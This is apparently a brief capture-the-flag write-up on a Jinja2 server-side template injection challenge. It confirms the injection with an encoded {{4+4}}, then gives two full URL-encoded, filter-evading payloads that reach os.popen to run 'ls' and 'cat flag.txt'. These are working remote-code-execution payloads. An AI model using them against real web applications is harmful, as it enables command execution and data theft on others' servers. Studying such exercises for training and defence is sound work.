# 5571

- chall name looks like SSTI

- lets try some payloads.
  
- `{{7*7}} is blocked`
- `%7B%7B4+4%7D%7D` is nothing but `{{4+4}}` which evaluates which means we have SSTI in jinja2

- finally we can get the flag when encode everything by trial and error to generate this payload : 
```
%7B%7Burl_for%7Cattr(%27%27~%27_%27~%27_%27~%27glob%27~%27als%27~%27_%27~%27_%27)%7Cattr(%27%27~%27_%27~%27_%27~%27get%27~%27item%27~%27_%27~%27_%27)(%27%27~%27_%27~%27_%27~%27b%27~%27u%27~%27i%27~%27l%27~%27t%27~%27i%27~%27n%27~%27s%27~%27_%27~%27_%27)%7Cattr(%27%27~%27_%27~%27_%27~%27get%27~%27item%27~%27_%27~%27_%27)(%27%27~%27_%27~%27_%27~%27i%27~%27m%27~%27p%27~%27o%27~%27r%27~%27t%27~%27_%27~%27_%27)(%27o%27~%27s%27)%7Cattr(%27p%27~%27o%27~%27p%27~%27e%27~%27n%27)(%27ls%27)%7Cattr(%27read%27)()%7D%7D

- Now we read the flag using : 
```
%7B%7Burl_for%7Cattr(%27%27~%27_%27~%27_%27~%27glob%27~%27als%27~%27_%27~%27_%27)%7Cattr(%27%27~%27_%27~%27_%27~%27get%27~%27item%27~%27_%27~%27_%27)(%27%27~%27_%27~%27_%27~%27b%27~%27u%27~%27i%27~%27l%27~%27t%27~%27i%27~%27n%27~%27s%27~%27_%27~%27_%27)%7Cattr(%27%27~%27_%27~%27_%27~%27get%27~%27item%27~%27_%27~%27_%27)(%27%27~%27_%27~%27_%27~%27i%27~%27m%27~%27p%27~%27o%27~%27r%27~%27t%27~%27_%27~%27_%27)(%27o%27~%27s%27)%7Cattr(%27p%27~%27o%27~%27p%27~%27e%27~%27n%27)(%27c%27~%27a%27~%27t%27~%27%20%27~%27f%27~%27l%27~%27a%27~%27g%27~%27.%27~%27t%27~%27x%27~%27t%27)%7Cattr(%27read%27)()%7D%7D
